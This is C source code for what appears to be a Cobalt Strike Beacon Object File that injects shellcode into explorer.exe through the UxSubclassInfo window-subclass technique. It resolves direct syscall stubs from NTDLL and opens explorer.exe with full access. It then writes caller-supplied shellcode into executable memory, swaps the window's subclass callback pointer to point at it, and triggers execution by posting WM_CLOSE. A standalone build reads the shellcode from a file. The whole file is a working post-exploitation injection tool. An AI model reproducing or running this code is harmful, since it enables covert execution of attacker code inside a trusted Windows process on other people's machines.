#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"

typedef LRESULT (CALLBACK *SUBCLASSPROC)(
   HWND      hChildWindow,
   UINT      uMsg,
   WPARAM    wParam,
   LPARAM    lParam,
   UINT_PTR  uIdSubclass,
   DWORD_PTR dwRefData);

typedef struct _SUBCLASS_CALL {
  SUBCLASSPROC pfnSubclass;    // subclass procedure
  WPARAM       uIdSubclass;    // unique subclass identifier
  DWORD_PTR    dwRefData;      // optional ref data
} SUBCLASS_CALL, PSUBCLASS_CALL;

typedef struct _SUBCLASS_FRAME {
  UINT                    uCallIndex;   // index of next callback to call
  UINT                    uDeepestCall; // deepest uCallIndex on stack
  struct _SUBCLASS_FRAME  *pFramePrev;  // previous subclass frame pointer
  struct _SUBCLASS_HEADER *pHeader;     // header associated with this frame
} SUBCLASS_FRAME, PSUBCLASS_FRAME;

typedef struct _SUBCLASS_HEADER {
  UINT           uRefs;        // subclass count
  UINT           uAlloc;       // allocated subclass call nodes
  UINT           uCleanup;     // index of call node to clean up
  DWORD          dwThreadId;   // thread id of window we are hooking
  SUBCLASS_FRAME *pFrameCur;   // current subclass frame pointer
  SUBCLASS_CALL  CallArray[1]; // base of packed call node array
} SUBCLASS_HEADER, *PSUBCLASS_HEADER;



DWORD uxsubclassinfo(LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD  dwErrorCode = ERROR_SUCCESS;
    HWND hProgmanWindow = NULL;
    HWND hChildWindow = NULL;
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    PHMOD hNTDLL = NULL;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = NULL;
    NtReadVirtualMemory_t NtReadVirtualMemory = NULL;
    NtWriteVirtualMemory_t NtWriteVirtualMemory = NULL;
    NtFreeVirtualMemory_t NtFreeVirtualMemory = NULL;
    SIZE_T RegionSize = 0;
    LPVOID lpRemoteShellcodeBuffer = NULL;
    LPVOID lpRemoteSubclassHeaderBuffer = NULL;
    HANDLE lpSubclassHeader = NULL;
    SUBCLASS_HEADER subclassHeader;
    LPVOID pfnSubclass = NULL;
 
 /*
    internal_printf("lpShellcodeBuffer:     %p\n", lpShellcodeBuffer);
    internal_printf("dwShellcodeBufferSize: %lu\n", dwShellcodeBufferSize);
*/

    // Custom LoadLibrary on NTDLL
    hNTDLL = _LoadLibrary(NTDLL_PATH);
    if(NULL == hNTDLL) { goto end; }

    // Get the syscall addresses
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub(hNTDLL, "NtAllocateVirtualMemory");
    NtReadVirtualMemory = (NtReadVirtualMemory_t)GetSyscallStub(hNTDLL, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetSyscallStub(hNTDLL, "NtWriteVirtualMemory");
    NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetSyscallStub(hNTDLL, "NtFreeVirtualMemory");
    if ((NULL == NtAllocateVirtualMemory) || 
        (NULL == NtReadVirtualMemory) || 
        (NULL == NtWriteVirtualMemory) || 
        (NULL == NtFreeVirtualMemory)
    )
    {
        dwErrorCode = ERROR_PROC_NOT_FOUND;
        internal_printf("GetSyscallStub failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get a handle to explorer.exe's main window
    hProgmanWindow = USER32$FindWindowA("Progman", NULL);
    if (NULL == hProgmanWindow)
    {
        dwErrorCode = KERNEL32$GetLastError();
        if (ERROR_SUCCESS == dwErrorCode) { dwErrorCode = ERROR_INVALID_HANDLE; }
        internal_printf("FindWindowA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get a handle to the SHELLDLL_DefView child window
    hChildWindow = USER32$FindWindowExA(hProgmanWindow, NULL, "SHELLDLL_DefView", NULL);
    if (NULL == hChildWindow)
    {
        dwErrorCode = KERNEL32$GetLastError();
        if (ERROR_SUCCESS == dwErrorCode) { dwErrorCode = ERROR_INVALID_HANDLE; }
        internal_printf("FindWindowExA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get the process ID for explorer
    USER32$GetWindowThreadProcessId(hChildWindow, &dwProcessId);

    internal_printf("Injecting into explorer.exe with PID:%lu\n", dwProcessId);

    // Open explorer.exe
    hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL == hProcess)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("OpenProcess failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get the SUBCLASS_HEADER property
    lpSubclassHeader = USER32$GetPropA(hChildWindow, "UxSubclassInfo");
    if (NULL == lpSubclassHeader)
    {
        dwErrorCode = ERROR_INVALID_HANDLE;
        internal_printf("GetPropA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Read in the SUBCLASS_HEADER from the remote process
    intZeroMemory(&subclassHeader, sizeof(subclassHeader));
    dwErrorCode = NtReadVirtualMemory(
        hProcess, 
        (LPVOID)lpSubclassHeader, 
        &subclassHeader, 
        sizeof(subclassHeader), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtReadVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Allocate the new SUBCLASS_HEADER
    RegionSize = sizeof(subclassHeader) + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        hProcess, 
        &lpRemoteSubclassHeaderBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }
    
    // Allocate remote shellcode buffer
    RegionSize = dwShellcodeBufferSize + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        hProcess, 
        &lpRemoteShellcodeBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the shellcode to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        hProcess, 
        lpRemoteShellcodeBuffer, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize, 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Update the SUBCLASS_HEADER
    subclassHeader.CallArray[0].pfnSubclass = (SUBCLASSPROC)lpRemoteShellcodeBuffer;

    // Write the new SUBCLASS_HEADER to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        hProcess, 
        lpRemoteSubclassHeaderBuffer, 
        &subclassHeader, 
        sizeof(subclassHeader), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Update the SUBCLASS_HEADER property
    if ( FALSE == USER32$SetPropA(hChildWindow, "UxSubclassInfo", lpRemoteSubclassHeaderBuffer) )
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("SetPropA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Trigger execution
    if ( FALSE == USER32$PostMessageA(hChildWindow, WM_CLOSE, 0, 0) )
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("PostMessageA failed (%lu)\n", dwErrorCode);
        //goto end;
    }

    KERNEL32$Sleep(10);

    // Restore the original SUBCLASS_HEADER property
    if ( FALSE == USER32$SetPropA(hChildWindow, "UxSubclassInfo", lpSubclassHeader) )
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("SetPropA failed (%lu)\n", dwErrorCode);
        goto end;
    }

end:
    // Free the new remote SUBCLASS_HEADER
    if (lpRemoteSubclassHeaderBuffer)
    {
        NtFreeVirtualMemory(
            hProcess, 
            lpRemoteSubclassHeaderBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteSubclassHeaderBuffer = NULL;
    }

    // Free remote shellcode?
    /*
    if (lpRemoteShellcodeBuffer)
    {
        NtFreeVirtualMemory(
            hProcess, 
            lpRemoteShellcodeBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteShellcodeBuffer = NULL;
    }
    */

    if (hProcess)
    {
        KERNEL32$CloseHandle(hProcess);
        hProcess = NULL;
    }

    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
	datap   parser;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    
    // Get the arguments <SHELLCODE>
	BeaconDataParse(&parser, Buffer, Length);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
	{
		return;
	}

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__   
    internal_printf("uxsubclassinfo( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = uxsubclassinfo(
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "uxsubclassinfo failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

	printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;

    // Check to see if we received any arguments
    if (2 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <SHELLCODE>\n", argv[0]);
        goto end;
    }

    dwErrorCode = ReadFileIntoBuffer(argv[1], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__       
    internal_printf("uxsubclassinfo( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = uxsubclassinfo(
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "uxsubclassinfo failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    if(lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif
